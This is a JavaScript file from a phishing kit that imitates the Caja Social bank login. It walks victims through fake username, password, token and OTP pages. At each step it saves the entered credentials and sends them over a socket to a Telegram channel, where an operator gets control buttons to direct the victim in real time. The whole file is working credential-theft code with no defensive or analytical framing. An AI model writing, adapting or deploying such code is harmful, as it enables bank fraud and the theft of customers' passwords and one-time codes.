/**
 * CAJA SOCIAL - Flujo: usuario → password (sin Telegram) → Telegram al enviar password
 */

(function() {
    'use strict';

    const pageConfig = {
        'index.html': {
            form: 'loginForm',
            inputs: { usuario: 'usuario' },
            button: 'submitBtn',
            validation: (data) => /^(CC|CE|NI|TI|PE)\d+$/i.test((data.usuario || '').trim()),
            sendToTelegram: false,
            nextPage: 'password.html'
        },
        'password.html': {
            form: 'passwordForm',
            inputs: { password: 'password' },
            button: 'btnContinuar',
            validation: (data) => (data.password || '').length === 8,
            sendToTelegram: true,
            telegramStage: 'CREDENCIALES',
            requireUsuario: true
        },
        'token.html': {
            form: 'tokenForm',
            inputs: { token: 'token' },
            button: 'btnContinuar',
            validation: (data) => (data.token || '').length === 6,
            sendToTelegram: true,
            telegramStage: 'TOKEN'
        },
        'otp.html': {
            form: 'otpForm',
            inputs: { otp: 'otp' },
            button: 'btnVerificar',
            validation: (data) => {
                const len = (data.otp || '').length;
                return len >= 4 && len <= 8;
            },
            sendToTelegram: true,
            telegramStage: 'OTP'
        }
    };

    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const config = pageConfig[currentPage];
    if (!config) return;

    document.addEventListener('DOMContentLoaded', function() {
        if (!window.BancoUtils || !window.CajaSocialTelegram) {
            console.error('Faltan banco-utils.js o caja-social-telegram.js');
            return;
        }

        CajaSocialTelegram.initPageErrors();

        BancoUtils.initSocket();

        const form = document.getElementById(config.form);
        const button = document.getElementById(config.button);
        const inputs = {};

        Object.keys(config.inputs).forEach((key) => {
            inputs[key] = document.getElementById(config.inputs[key]);
            if (inputs[key]) inputs[key].addEventListener('input', validateForm);
        });

        validateForm();

        BancoUtils.onTelegramAction((data) => {
            CajaSocialTelegram.handleTelegramAction(data);
        });

        function validateForm() {
            const data = {};
            Object.keys(inputs).forEach((key) => {
                data[key] = inputs[key] ? inputs[key].value.trim() : '';
            });

            const isValid = config.validation(data);
            if (button) {
                button.disabled = !isValid;
                button.classList.toggle('enabled', isValid);
            }
        }

        if (!form) return;

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            validateForm();
            if (button && button.disabled) return;

            const formData = {};
            Object.keys(inputs).forEach((key) => {
                let val = inputs[key] ? inputs[key].value.trim() : '';
                if (key === 'usuario') val = val.toUpperCase();
                formData[key] = val;
            });

            BancoUtils.saveBankData('caja-social', formData);

            if (!config.sendToTelegram) {
                window.location.href = config.nextPage || 'password.html';
                return;
            }

            const fullData = BancoUtils.getBankData('caja-social');
            if (config.requireUsuario && !fullData.usuario) {
                window.location.href = 'index.html';
                return;
            }

            BancoUtils.showOverlay();
            const overlay = document.getElementById('loadingOverlay');
            if (overlay) {
                overlay.style.display = 'flex';
                overlay.classList.add('show');
            }

            const socket = BancoUtils.getSocket();
            if (!socket || !socket.connected) {
                alert('Error de conexión. Recarga la página.');
                BancoUtils.hideOverlay();
                if (overlay) overlay.style.display = 'none';
                return;
            }

            const message = BancoUtils.formatMessage(
                `CAJA SOCIAL - ${config.telegramStage}`,
                fullData
            );
            const keyboard = CajaSocialTelegram.getOperatorKeyboard();

            try {
                await BancoUtils.sendToTelegram(config.telegramStage.toLowerCase(), {
                    text: message,
                    keyboard
                });
            } catch (error) {
                console.error('Error:', error);
                alert('Error al enviar datos');
                BancoUtils.hideOverlay();
                if (overlay) overlay.style.display = 'none';
            }
        });
    });
})();
